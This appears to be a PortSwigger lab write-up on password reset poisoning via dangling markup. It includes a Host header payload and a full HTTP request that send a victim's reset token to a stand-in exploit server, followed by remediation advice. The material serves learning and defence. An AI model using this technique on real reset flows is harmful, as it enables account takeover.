# Lab: Password Reset Poisoning via Dangling Markup

**Category:** HTTP Host Header Attacks
**Difficulty:** Expert
**Lab link:** [Password reset poisoning via dangling markup](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)

## Overview

The password reset function inserts the `Host` header value directly into the HTML email body. By injecting unclosed HTML markup into the Host header, an attacker creates a "dangling markup" injection — the email client's HTML parser treats subsequent email content (including the reset token) as part of an attribute value, causing it to be exfiltrated to the attacker's server when the email is rendered.

## Key Concepts

- **Dangling markup injection:** An unclosed HTML attribute (e.g. `href="//attacker?`) in the email body causes the parser to treat everything up to the next `"` as the attribute value — capturing text the attacker didn't directly control.
- **Host header in email:** The app uses the `Host` header to construct the reset URL in the email, inserting it unescaped into HTML.
- **Token exfiltration:** The email client fetches the `href` URL (attacker's server) with the reset token as a query parameter, which is logged in the access log.
- **No direct link click required:** The browser/email client may prefetch or auto-fetch the link, leaking the token without victim interaction.

## Exploit Payload

Host header injection:
```
Host: <lab>:'<a href="//exploit-server.exploit-server.net?
```

This turns the reset email into:
```html
...your reset link: https://<lab>:'<a href="//exploit-server?/forgot-password?temp-forgot-password-token=TOKEN"...
```

The HTML parser sees an `<a href="//exploit-server?/forgot-password?temp-forgot-password-token=TOKEN">` — when rendered, the browser fetches the exploit server URL with the token in the query string.

## Solution

### Step 1 — Check the email format

Trigger a reset for `wiener` and view the email source. Note how the Host value appears in the HTML — confirm it's injected into an `href` or similar attribute unescaped.

### Step 2 — Send poisoned reset for carlos

```http
POST /forgot-password HTTP/1.1
Host: <lab>:'<a href="//exploit-server.exploit-server.net?
Content-Type: application/x-www-form-urlencoded

username=carlos
```

### Step 3 — Steal the token from exploit server access log

The email client renders the HTML and fetches the crafted link. Check the access log for:
```
GET /?/forgot-password?temp-forgot-password-token=<TOKEN>
```

### Step 4 — Reset carlos's password

Visit `https://<lab>/forgot-password?temp-forgot-password-token=<TOKEN>`, set a new password, log in as carlos. Lab solved.

## Remediation

- Never insert the `Host` header directly into HTML email content — use a hardcoded base URL from server configuration.
- HTML-encode all user-controlled or externally-influenced values before inserting into HTML.
- Implement a strict Content Security Policy on email clients to block external resource loads.
- Use `Content-Security-Policy` headers on the reset page itself.

## Key Takeaways

- Dangling markup is a powerful exfiltration technique — it doesn't require script execution, only an unsanitised HTML attribute.
- Password reset emails that reflect the Host header are vulnerable even if the token itself is cryptographically strong.
- Always test reset email flows with a Burp Collaborator or exploit server as the Host value.
